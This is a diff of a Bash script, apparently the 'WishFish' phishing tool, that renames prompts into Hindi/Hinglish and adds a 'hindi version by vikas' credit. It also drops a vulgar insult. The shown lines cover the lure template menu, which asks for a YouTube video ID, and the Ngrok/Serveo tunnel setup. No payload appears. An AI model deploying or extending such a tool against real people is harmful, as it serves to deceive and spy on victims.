@@ -8,7 +8,7 @@ echo -e "\033[31m  \ \  /\  / / _ ___| | __ \e[0m| |__   _ ___| |__       ";
 echo -e "\033[31m   \ \  Digital panda '_  |\e[0m| | | / __| '_ \      ";
 echo -e "\033[31m    \  /\  /  | \__ \ | | |\e[0m| |    | \__ \ | | |     ";
 echo -e "\033[31m     \/  \/   |_|__ /_| |_|\e[0m|_|    |_|___/_| |_| ";
-
+printf "\n                 This is a hindi version by vikas                 "
 printf " \e[1;93m WishFish v3.0\e[0m \n"
 printf " \e[1;77m  Made By vikas  | if you think you bad than am your dad \e[0m \n"
 
@@ -154,7 +154,7 @@ read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] YouTube video watch ID enter k
 elif [[ $option_tem -eq 3 ]]; then
 printf ""
 else
-printf "\e[1;93m [!] bsdk kya kar raha ! try again\e[0m\n"
+printf "\e[1;93m [!] Thik say kar wai  ! \e[0m\n"
 sleep 1
 select_template
 fi
@@ -199,7 +199,7 @@ fi
 if [[ -e ~/.ngrok2/ngrok.yml ]]; then
 printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
 cat  ~/.ngrok2/ngrok.yml
-read -p $'\n\e[1;92m[\e[0m+\e[1;92m] ngrok authtoken token badlay gaa? [Y/n]:\e[0m ' chg_token
+read -p $'\n\e[1;92m[\e[0m+\e[1;92m] ngrok authtoken badlay gaa? [Y/n]:\e[0m ' chg_token
 if [[ $chg_token == "Y" || $chg_token == "y" || $cchg_token == "Yes" || $cchg_token == "yes" ]]; then
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ngrok authtoken enter kar: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
@@ -236,7 +236,7 @@ if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
 
-printf "\n[Choose tunnel server]\n"    
+printf "\n[tunnal server select kar bhai  ]\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 default_option_server="1"
